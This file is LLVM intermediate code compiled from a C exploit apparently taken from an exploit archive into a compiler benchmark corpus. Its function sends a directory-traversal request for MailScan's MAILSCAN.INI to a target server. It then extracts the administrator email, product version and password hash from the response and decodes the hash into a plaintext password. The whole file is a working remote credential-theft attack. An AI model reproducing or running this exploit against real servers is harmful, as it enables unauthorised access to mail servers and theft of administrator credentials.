; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_6407.c_exploit.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_6407.c_exploit.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [21 x i8] c"[!] Targeting %s:%s\0A\00", align 1
@.str.1 = private unnamed_addr constant [8 x i8] c"http://\00", align 1
@.str.2 = private unnamed_addr constant [44 x i8] c"/../../../../PROGRA~1/MailScan/MAILSCAN.INI\00", align 1
@INTERNET_OPEN_TYPE_DIRECT = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [23 x i8] c"[!] Building request!\0A\00", align 1
@.str.4 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.5 = private unnamed_addr constant [29 x i8] c"[-] Error building request!\0A\00", align 1
@.str.6 = private unnamed_addr constant [31 x i8] c"[!] Trying to connect @ %s:%s\0A\00", align 1
@INTERNET_FLAG_RELOAD = common dso_local global i32 0, align 4
@INTERNET_FLAG_NO_CACHE_WRITE = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [24 x i8] c"[!] Connected to host!\0A\00", align 1
@.str.8 = private unnamed_addr constant [30 x i8] c"[-] Error while connecting! \0A\00", align 1
@.str.9 = private unnamed_addr constant [10 x i8] c"[General]\00", align 1
@.str.10 = private unnamed_addr constant [14 x i8] c"UserPassword=\00", align 1
@.str.11 = private unnamed_addr constant [17 x i8] c"UserPassword=%s \00", align 1
@.str.12 = private unnamed_addr constant [14 x i8] c"AdminEmailId=\00", align 1
@.str.13 = private unnamed_addr constant [17 x i8] c"AdminEmailId=%s \00", align 1
@.str.14 = private unnamed_addr constant [13 x i8] c"ProductName=\00", align 1
@.str.15 = private unnamed_addr constant [16 x i8] c"ProductName=%s \00", align 1
@.str.16 = private unnamed_addr constant [9 x i8] c"Version=\00", align 1
@.str.17 = private unnamed_addr constant [12 x i8] c"Version=%s \00", align 1
@.str.18 = private unnamed_addr constant [24 x i8] c"[-] Server not vuln :(\0A\00", align 1
@.str.19 = private unnamed_addr constant [19 x i8] c"[+] SERVER: %s %s\0A\00", align 1
@.str.20 = private unnamed_addr constant [15 x i8] c"[+] ADMIN: %s\0A\00", align 1
@.str.21 = private unnamed_addr constant [14 x i8] c"[+] HASH: %s\0A\00", align 1
@.str.22 = private unnamed_addr constant [11 x i8] c"[+] PASS: \00", align 1
@Count = common dso_local global i32 0, align 4
@.str.23 = private unnamed_addr constant [3 x i8] c"%c\00", align 1
@.str.24 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.25 = private unnamed_addr constant [12 x i8] c"\0A[+] Done!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @exploit(i8* %0, i8* %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [1024 x i8], align 16
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca [1025 x i8], align 16
  %14 = alloca [1025 x i8], align 16
  %15 = alloca [1025 x i8], align 16
  %16 = alloca [1025 x i8], align 16
  %17 = alloca [1025 x i8], align 16
  %18 = alloca [1025 x i8], align 16
  %19 = alloca [1025 x i8], align 16
  %20 = alloca i32, align 4
  %21 = alloca [255 x i8], align 16
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %22 = load i8*, i8** %4, align 8
  %23 = load i8*, i8** %5, align 8
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str, i64 0, i64 0), i8* %22, i8* %23)
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), i8** %11, align 8
  store i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.2, i64 0, i64 0), i8** %12, align 8
  %25 = load i32, i32* @INTERNET_OPEN_TYPE_DIRECT, align 4
  %26 = call i32 @InternetOpen(i32* null, i32 %25, i32* null, i32* null, i32 0)
  store i32 %26, i32* %6, align 4
  %27 = icmp ne i32 %26, 0
  br i1 %27, label %28, label %71

28:                                               ; preds = %2
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.3, i64 0, i64 0))
  %30 = getelementptr inbounds [1025 x i8], [1025 x i8]* %13, i64 0, i64 0
  %31 = call i32 @memset(i8* %30, i32 0, i32 1025)
  %32 = getelementptr inbounds [1025 x i8], [1025 x i8]* %13, i64 0, i64 0
  %33 = load i8*, i8** %11, align 8
  %34 = load i8*, i8** %11, align 8
  %35 = call i32 @strlen(i8* %34)
  %36 = call i32 @memcpy(i8* %32, i8* %33, i32 %35)
  %37 = getelementptr inbounds [1025 x i8], [1025 x i8]* %13, i64 0, i64 0
  %38 = getelementptr inbounds [1025 x i8], [1025 x i8]* %13, i64 0, i64 0
  %39 = call i32 @strlen(i8* %38)
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %37, i64 %40
  %42 = load i8*, i8** %4, align 8
  %43 = load i8*, i8** %4, align 8
  %44 = call i32 @strlen(i8* %43)
  %45 = call i32 @memcpy(i8* %41, i8* %42, i32 %44)
  %46 = getelementptr inbounds [1025 x i8], [1025 x i8]* %13, i64 0, i64 0
  %47 = getelementptr inbounds [1025 x i8], [1025 x i8]* %13, i64 0, i64 0
  %48 = call i32 @strlen(i8* %47)
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds i8, i8* %46, i64 %49
  %51 = call i32 @strlen(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0))
  %52 = call i32 @memcpy(i8* %50, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0), i32 %51)
  %53 = getelementptr inbounds [1025 x i8], [1025 x i8]* %13, i64 0, i64 0
  %54 = getelementptr inbounds [1025 x i8], [1025 x i8]* %13, i64 0, i64 0
  %55 = call i32 @strlen(i8* %54)
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds i8, i8* %53, i64 %56
  %58 = load i8*, i8** %5, align 8
  %59 = load i8*, i8** %5, align 8
  %60 = call i32 @strlen(i8* %59)
  %61 = call i32 @memcpy(i8* %57, i8* %58, i32 %60)
  %62 = getelementptr inbounds [1025 x i8], [1025 x i8]* %13, i64 0, i64 0
  %63 = getelementptr inbounds [1025 x i8], [1025 x i8]* %13, i64 0, i64 0
  %64 = call i32 @strlen(i8* %63)
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %62, i64 %65
  %67 = load i8*, i8** %12, align 8
  %68 = load i8*, i8** %12, align 8
  %69 = call i32 @strlen(i8* %68)
  %70 = call i32 @memcpy(i8* %66, i8* %67, i32 %69)
  br label %77

71:                                               ; preds = %2
  %72 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.5, i64 0, i64 0))
  %73 = load i32, i32* %6, align 4
  %74 = call i32 @InternetCloseHandle(i32 %73)
  %75 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %76 = call i32 @CloseHandle(i8* %75)
  store i32 0, i32* %3, align 4
  br label %196

77:                                               ; preds = %28
  %78 = load i8*, i8** %4, align 8
  %79 = load i8*, i8** %5, align 8
  %80 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.6, i64 0, i64 0), i8* %78, i8* %79)
  %81 = load i32, i32* %6, align 4
  %82 = getelementptr inbounds [1025 x i8], [1025 x i8]* %13, i64 0, i64 0
  %83 = load i32, i32* @INTERNET_FLAG_RELOAD, align 4
  %84 = load i32, i32* @INTERNET_FLAG_NO_CACHE_WRITE, align 4
  %85 = or i32 %83, %84
  %86 = call i32 @InternetOpenUrl(i32 %81, i8* %82, i32* null, i32* null, i32 %85, i32* null)
  store i32 %86, i32* %7, align 4
  %87 = icmp ne i32 %86, 0
  br i1 %87, label %88, label %90

88:                                               ; preds = %77
  %89 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.7, i64 0, i64 0))
  br label %98

90:                                               ; preds = %77
  %91 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.8, i64 0, i64 0))
  %92 = load i32, i32* %6, align 4
  %93 = call i32 @InternetCloseHandle(i32 %92)
  %94 = load i32, i32* %7, align 4
  %95 = call i32 @InternetCloseHandle(i32 %94)
  %96 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %97 = call i32 @CloseHandle(i8* %96)
  store i32 0, i32* %3, align 4
  br label %196

98:                                               ; preds = %88
  %99 = load i32, i32* %7, align 4
  %100 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %101 = call i64 @InternetReadFile(i32 %99, i8* %100, i32 1024, i32* %9)
  %102 = icmp ne i64 %101, 0
  br i1 %102, label %103, label %187

103:                                              ; preds = %98
  %104 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %105 = call i8* @strstr(i8* %104, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.9, i64 0, i64 0))
  store i8* %105, i8** %10, align 8
  %106 = icmp ne i8* %105, null
  br i1 %106, label %107, label %128

107:                                              ; preds = %103
  %108 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %109 = call i8* @strstr(i8* %108, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.10, i64 0, i64 0))
  store i8* %109, i8** %10, align 8
  %110 = load i8*, i8** %10, align 8
  %111 = getelementptr inbounds [1025 x i8], [1025 x i8]* %14, i64 0, i64 0
  %112 = call i32 @sscanf(i8* %110, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.11, i64 0, i64 0), i8* %111)
  %113 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %114 = call i8* @strstr(i8* %113, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.12, i64 0, i64 0))
  store i8* %114, i8** %10, align 8
  %115 = load i8*, i8** %10, align 8
  %116 = getelementptr inbounds [1025 x i8], [1025 x i8]* %15, i64 0, i64 0
  %117 = call i32 @sscanf(i8* %115, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.13, i64 0, i64 0), i8* %116)
  %118 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %119 = call i8* @strstr(i8* %118, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.14, i64 0, i64 0))
  store i8* %119, i8** %10, align 8
  %120 = load i8*, i8** %10, align 8
  %121 = getelementptr inbounds [1025 x i8], [1025 x i8]* %16, i64 0, i64 0
  %122 = call i32 @sscanf(i8* %120, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.15, i64 0, i64 0), i8* %121)
  %123 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %124 = call i8* @strstr(i8* %123, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.16, i64 0, i64 0))
  store i8* %124, i8** %10, align 8
  %125 = load i8*, i8** %10, align 8
  %126 = getelementptr inbounds [1025 x i8], [1025 x i8]* %17, i64 0, i64 0
  %127 = call i32 @sscanf(i8* %125, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.17, i64 0, i64 0), i8* %126)
  br label %128

128:                                              ; preds = %107, %103
  %129 = load i8*, i8** %10, align 8
  %130 = icmp eq i8* %129, null
  br i1 %130, label %131, label %133

131:                                              ; preds = %128
  %132 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.18, i64 0, i64 0))
  br label %186

133:                                              ; preds = %128
  %134 = getelementptr inbounds [1025 x i8], [1025 x i8]* %16, i64 0, i64 0
  %135 = getelementptr inbounds [1025 x i8], [1025 x i8]* %17, i64 0, i64 0
  %136 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.19, i64 0, i64 0), i8* %134, i8* %135)
  %137 = getelementptr inbounds [1025 x i8], [1025 x i8]* %15, i64 0, i64 0
  %138 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.20, i64 0, i64 0), i8* %137)
  %139 = getelementptr inbounds [1025 x i8], [1025 x i8]* %14, i64 0, i64 0
  %140 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.21, i64 0, i64 0), i8* %139)
  %141 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.22, i64 0, i64 0))
  %142 = getelementptr inbounds [1025 x i8], [1025 x i8]* %18, i64 0, i64 0
  %143 = call i32 @memset(i8* %142, i32 0, i32 1025)
  store i32 0, i32* %20, align 4
  br label %144

144:                                              ; preds = %181, %133
  %145 = load i32, i32* %20, align 4
  %146 = getelementptr inbounds [1025 x i8], [1025 x i8]* %14, i64 0, i64 0
  %147 = call i32 @strlen(i8* %146)
  %148 = icmp slt i32 %145, %147
  br i1 %148, label %149, label %184

149:                                              ; preds = %144
  %150 = load i32, i32* @Count, align 4
  %151 = add nsw i32 %150, 1
  store i32 %151, i32* @Count, align 4
  %152 = getelementptr inbounds [1025 x i8], [1025 x i8]* %19, i64 0, i64 0
  %153 = load i32, i32* %20, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds [1025 x i8], [1025 x i8]* %14, i64 0, i64 %154
  %156 = load i8, i8* %155, align 1
  %157 = sext i8 %156 to i32
  %158 = call i32 (i8*, i8*, ...) @sprintf(i8* %152, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.23, i64 0, i64 0), i32 %157)
  %159 = getelementptr inbounds [1025 x i8], [1025 x i8]* %18, i64 0, i64 0
  %160 = getelementptr inbounds [1025 x i8], [1025 x i8]* %18, i64 0, i64 0
  %161 = call i32 @strlen(i8* %160)
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds i8, i8* %159, i64 %162
  %164 = getelementptr inbounds [1025 x i8], [1025 x i8]* %19, i64 0, i64 0
  %165 = getelementptr inbounds [1025 x i8], [1025 x i8]* %19, i64 0, i64 0
  %166 = call i32 @strlen(i8* %165)
  %167 = call i32 @memcpy(i8* %163, i8* %164, i32 %166)
  %168 = load i32, i32* @Count, align 4
  %169 = icmp eq i32 %168, 2
  br i1 %169, label %170, label %180

170:                                              ; preds = %149
  %171 = getelementptr inbounds [255 x i8], [255 x i8]* %21, i64 0, i64 0
  %172 = call i32 @memset(i8* %171, i32 0, i32 4)
  %173 = getelementptr inbounds [255 x i8], [255 x i8]* %21, i64 0, i64 0
  %174 = getelementptr inbounds [1025 x i8], [1025 x i8]* %18, i64 0, i64 0
  %175 = call i32 (i8*, i8*, ...) @sprintf(i8* %173, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.24, i64 0, i64 0), i8* %174)
  %176 = getelementptr inbounds [255 x i8], [255 x i8]* %21, i64 0, i64 0
  %177 = call i32 @decode_hash(i8* %176)
  %178 = getelementptr inbounds [1025 x i8], [1025 x i8]* %18, i64 0, i64 0
  %179 = call i32 @memset(i8* %178, i32 0, i32 1025)
  store i32 0, i32* @Count, align 4
  br label %180

180:                                              ; preds = %170, %149
  br label %181

181:                                              ; preds = %180
  %182 = load i32, i32* %20, align 4
  %183 = add nsw i32 %182, 1
  store i32 %183, i32* %20, align 4
  br label %144

184:                                              ; preds = %144
  %185 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.25, i64 0, i64 0))
  br label %186

186:                                              ; preds = %184, %131
  br label %189

187:                                              ; preds = %98
  %188 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.18, i64 0, i64 0))
  br label %189

189:                                              ; preds = %187, %186
  %190 = load i32, i32* %6, align 4
  %191 = call i32 @InternetCloseHandle(i32 %190)
  %192 = load i32, i32* %7, align 4
  %193 = call i32 @InternetCloseHandle(i32 %192)
  %194 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %195 = call i32 @CloseHandle(i8* %194)
  store i32 0, i32* %3, align 4
  br label %196

196:                                              ; preds = %189, %90, %71
  %197 = load i32, i32* %3, align 4
  ret i32 %197
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @InternetOpen(i32*, i32, i32*, i32*, i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @InternetCloseHandle(i32) #1

declare dso_local i32 @CloseHandle(i8*) #1

declare dso_local i32 @InternetOpenUrl(i32, i8*, i32*, i32*, i32, i32*) #1

declare dso_local i64 @InternetReadFile(i32, i8*, i32, i32*) #1

declare dso_local i8* @strstr(i8*, i8*) #1

declare dso_local i32 @sscanf(i8*, i8*, i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, ...) #1

declare dso_local i32 @decode_hash(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
